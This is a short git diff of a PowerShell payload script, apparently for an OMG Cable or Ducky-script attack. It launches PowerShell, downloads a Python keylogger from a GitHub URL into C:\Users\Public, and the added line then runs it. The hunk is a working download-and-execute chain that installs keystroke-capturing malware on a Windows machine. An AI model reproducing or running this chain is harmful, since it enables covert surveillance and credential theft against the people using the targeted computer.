@@ -9,3 +9,4 @@ invoke-expression 'cmd /c start powershell -Command { Start-Sleep -Seconds 20; $
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/python%20keylogger%20test.py" -outfile "C:\Users\Public\pythonkl.py"
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+python C:\Users\Public\pythonkl.py
